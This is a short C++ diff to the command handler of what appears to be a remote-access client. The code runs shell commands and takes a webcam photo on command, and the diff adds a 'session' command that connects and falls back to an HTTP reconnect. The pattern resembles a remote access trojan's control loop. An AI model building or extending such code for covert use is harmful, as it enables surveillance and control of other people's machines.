@@ -14,9 +14,11 @@
 #include "directory_traversal.hpp"
 #include "images.hpp"
 #include "../../Generic/logging.hpp"   
+#include "../../Generic/session/session.hpp"
 
 
 #pragma comment(lib, "iphlpapi.lib")
+
 
 
 std::string executeShellCommand(const char* cmd) {
@@ -189,9 +191,17 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "snap") {
         CapturePhoto(L"test.jpg");
         return "Picture taken";
+    } else if (command == "session") {
+        logger.log("Starting sessionConnect");
+        if (!sessionConnect()) {
+            logger.warn("Could not access session - reconnect initisalised.");  
+            logger.warn("Session exiting, http reconnect");
+            return "Reconnected via HTTP";
+        }
+        return "Session connected";
     } else {
         logger.error("Unknown command: " + command);
-    return "not a supported command";
+        return "not a supported command";
     }
     return "error";
 }
